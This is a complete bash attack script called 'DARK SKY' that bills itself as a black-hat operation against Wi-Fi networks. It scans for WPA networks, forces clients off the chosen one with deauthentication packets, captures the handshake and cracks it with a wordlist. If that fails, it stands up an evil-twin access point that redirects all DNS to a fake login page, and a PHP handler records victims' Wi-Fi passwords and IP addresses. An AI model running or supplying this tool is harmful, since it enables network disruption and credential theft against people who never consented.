#!/bin/bash

# DARK SKY - FULL Wi-Fi Handshake Capture and FakeAP Phishing
# Fixed version with improved reliability and error handling

clear
echo "██████╗  █████╗ ██████╗ ██╗  ██╗    ███████╗██╗  ██╗██╗███████╗██╗   ██╗"
echo "██╔══██╗██╔══██╗██╔══██╗╚██╗██╔╝    ██╔════╝██║  ██║██║██╔════╝╚██╗ ██╔╝"
echo "██████╔╝███████║██████╔╝ ╚███╔╝     ███████╗███████║██║█████╗   ╚████╔╝ "
echo "██╔═══╝ ██╔══██║██╔═══╝  ██╔██╗     ╚════██║██╔══██║██║██╔══╝    ╚██╔╝  "
echo "██║     ██║  ██║██║     ██╔╝ ██╗    ███████║██║  ██║██║███████╗   ██║   "
echo "╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝╚══════╝   ╚═╝   "

echo "🦅 DARK SKY: REAL WPA2 HANDSHAKE + FAKE PORTAL 🦅"
echo "☢️ Full Automated Black Hat Operation ☢️"
echo ""

# Check for root
if [ "$(id -u)" != "0" ]; then
   echo "❌ This script must be run as root" 1>&2
   exit 1
fi

# Check for required tools
required_tools=("airmon-ng" "airodump-ng" "aireplay-ng" "aircrack-ng" "dnsmasq" "hostapd" "lighttpd" "timeout")
for tool in "${required_tools[@]}"; do
    if ! command -v $tool &> /dev/null; then
        echo "❌ $tool is not installed. Please install it first."
        exit 1
    fi
done

# Global variables
scan_completed=false
usePhishing=false
wlanName=""
monAdapter=""
pids=()

cleanup() {
    echo -e "\n🛑 CLEANUP: Stopping attacks..."
    # Kill background processes
    for pid in "${pids[@]}"; do
        kill -9 $pid 2>/dev/null
    done
    
    # Reset network interfaces
    if [ -n "$monAdapter" ]; then
        airmon-ng stop "$monAdapter" >/dev/null 2>&1
    fi
    ip link set "$wlanName" down
    ip link set "$wlanName" up
    
    # Restart network services
    service NetworkManager restart 2>/dev/null || systemctl restart NetworkManager 2>/dev/null
    
    # Cleanup files
    rm -f /tmp/hostapd.conf /tmp/dnsmasq.conf 2>/dev/null
    echo "✅ Systems Restored."
    exit 0
}

scan_interrupt() {
    if [ "$scan_completed" = false ]; then
        echo -e "\n🔍 Scan interrupted. Processing results..."
        killall airodump-ng 2>/dev/null
        scan_completed=true
        return 0
    else
        cleanup
    fi
}

# Main script execution
trap cleanup INT
trap scan_interrupt SIGINT

# Step 1: Adapter Selection
echo "📡 Available network interfaces:"
ifconfig | grep -E "^[a-z0-9]+" | cut -d":" -f1

read -p "Enter your wireless adapter (e.g., wlan0): " wlanName

if ! ifconfig | grep -q "$wlanName"; then
    echo "❌ Adapter $wlanName not found. Please check the name and try again."
    exit 1
fi

# Step 2: Enable Monitor Mode
echo "🔄 Killing interfering processes..."
airmon-ng check kill >/dev/null 2>&1

echo "🔄 Starting monitor mode on $wlanName..."
if ! airmon-ng start "$wlanName" >/dev/null 2>&1; then
    echo "❌ Failed to enable monitor mode"
    cleanup
fi

# Detect monitor interface
monAdapter=$(iwconfig 2>/dev/null | grep "Mode:Monitor" | awk '{print $1}' | head -n 1)
if [ -z "$monAdapter" ]; then
    echo "❌ Could not detect monitor interface"
    cleanup
fi
echo "✅ Monitor mode enabled on interface: $monAdapter"

# Step 3: Network Scanning
echo "📡 SCANNING for networks..."
rm -f darksky-*.csv 2>/dev/null

echo "Select scanning method:"
echo "1) Automatic scan (15 seconds)"
echo "2) Manual scan (press Ctrl+C when you see target networks)"
read -p "Choose option [1/2]: " scan_option

if [[ "$scan_option" == "1" ]]; then
    echo "Starting automatic scan for 15 seconds..."
    timeout 15s airodump-ng --band abg "$monAdapter" -w darksky --output-format csv
else
    echo "Starting manual scan. Press CTRL+C when you see your target networks..."
    airodump-ng --band abg "$monAdapter" -w darksky --output-format csv &
    scan_pid=$!
    wait $scan_pid 2>/dev/null
fi

if [ ! -f darksky-01.csv ]; then
    echo "❌ No scan results found. Please try again."
    cleanup
fi

# Step 4: Target Selection
echo "📂 Processing scan results..."
ssids=($(awk -F ',' '/WPA/ {gsub(/^[ \t]+|[ \t]+$/, "", $14); if ($14 != "") print $14}' darksky-01.csv | sort | uniq))

if [ ${#ssids[@]} -eq 0 ]; then
    echo "❌ No WPA targets found. Try scanning again."
    cleanup
fi

echo ""
echo "🎯 Available WiFi Networks:"
for i in "${!ssids[@]}"; do
    escaped_ssid=$(echo "${ssids[$i]}" | sed 's/[]\/$*.^|[]/\\&/g')
    enc_type=$(awk -F ',' -v ssid="$escaped_ssid" '$0 ~ ssid {gsub(/^[ \t]+|[ \t]+$/, "", $6); print $6}' darksky-01.csv | head -n 1)
    echo "$i) ${ssids[$i]} ($enc_type)"
done

read -p "Select target SSID (number): " targetIndex

if ! [[ "$targetIndex" =~ ^[0-9]+$ ]] || [ "$targetIndex" -ge ${#ssids[@]} ]; then
    echo "❌ Invalid selection."
    cleanup
fi

targetSSID="${ssids[$targetIndex]}"
escapedSSID=$(echo "$targetSSID" | sed 's/[]\/$*.^|[]/\\&/g')
targetBSSID=$(awk -F ',' -v ssid="$escapedSSID" '$0 ~ ssid {gsub(/^[ \t]+|[ \t]+$/, "", $1); print $1}' darksky-01.csv | head -n 1)
targetChannel=$(awk -F ',' -v ssid="$escapedSSID" '$0 ~ ssid {gsub(/^[ \t]+|[ \t]+$/, "", $4); print $4}' darksky-01.csv | head -n 1 | tr -d '\r')

if [ -z "$targetBSSID" ] || [ -z "$targetChannel" ]; then
    echo "❌ Could not determine BSSID/channel for $targetSSID"
    cleanup
fi

echo "🔒 Target: $targetSSID (BSSID: $targetBSSID, Channel: $targetChannel)"

# Step 5: Handshake Capture
echo "🎯 Starting handshake capture..."
rm -f handshake-*.cap 2>/dev/null

airodump-ng --bssid "$targetBSSID" --channel "$targetChannel" -w handshake "$monAdapter" &
airodumpPID=$!
pids+=($airodumpPID)

echo "💣 Sending deauthentication packets..."
for i in {1..3}; do
    aireplay-ng --deauth 10 -a "$targetBSSID" "$monAdapter" >/dev/null 2>&1
    sleep 3
done

sleep 10
kill $airodumpPID 2>/dev/null

# Step 6: Handshake Verification
if aircrack-ng handshake-01.cap 2>/dev/null | grep -q "1 handshake"; then
    echo "✅ Handshake captured successfully!"
    read -p "Enter wordlist path (or press Enter for phishing mode): " wordlist
    
    if [ -n "$wordlist" ] && [ -f "$wordlist" ]; then
        echo "⚡ Starting password crack..."
        aircrack-ng handshake-01.cap -w "$wordlist" -b "$targetBSSID"
    else
        echo "⚠️ Switching to phishing mode..."
        usePhishing=true
    fi
else
    echo "❌ No handshake found. Switching to phishing mode..."
    usePhishing=true
fi

# Step 7: Phishing Mode
if [ "$usePhishing" = true ]; then
    echo "🛠️  Setting up Fake AP..."
    airmon-ng stop "$monAdapter" >/dev/null 2>&1
    ip link set "$wlanName" down
    ip link set "$wlanName" up
    
    # Hostapd config
    cat > /tmp/hostapd.conf <<EOF
interface=$wlanName
driver=nl80211
ssid=$targetSSID
hw_mode=g
channel=$targetChannel
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOF

    # Dnsmasq config
    cat > /tmp/dnsmasq.conf <<EOF
interface=$wlanName
dhcp-range=10.0.0.10,10.0.0.50,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
EOF

    # Configure interface
    ifconfig "$wlanName" up 10.0.0.1 netmask 255.255.255.0
    
    # Start services
    dnsmasq -C /tmp/dnsmasq.conf &
    pids+=($!)
    hostapd /tmp/hostapd.conf &
    pids+=($!)
    
    # Phishing portal
    mkdir -p /var/www/html
    cat > /var/www/html/index.html <<EOF
<!DOCTYPE html>
<html>
<head>
    <title>Network Login</title>
    <style>body {font-family: Arial; text-align: center;}</style>
</head>
<body>
    <h2>Network Authentication Required</h2>
    <form action="capture.php" method="POST">
        <input type="password" name="password" placeholder="Wi-Fi Password" required>
        <button type="submit">Connect</button>
    </form>
</body>
</html>
EOF

    cat > /var/www/html/capture.php <<EOF
<?php
file_put_contents('/var/www/html/creds.txt', "SSID: $targetSSID\nPASS: \${_POST['password']}\nIP: \${_SERVER['REMOTE_ADDR']}\n\n", FILE_APPEND);
header('Location: http://10.0.0.1/connecting.html');
EOF

    # Start web server
    lighttpd -f /etc/lighttpd/lighttpd.conf
    
    echo "✅ Fake AP Ready: $targetSSID"
    echo "📡 Captured credentials will be saved in /var/www/html/creds.txt"
    echo "⚠️  Press CTRL+C to stop"
    
    while true; do
        sleep 1
    done
fi

cleanup
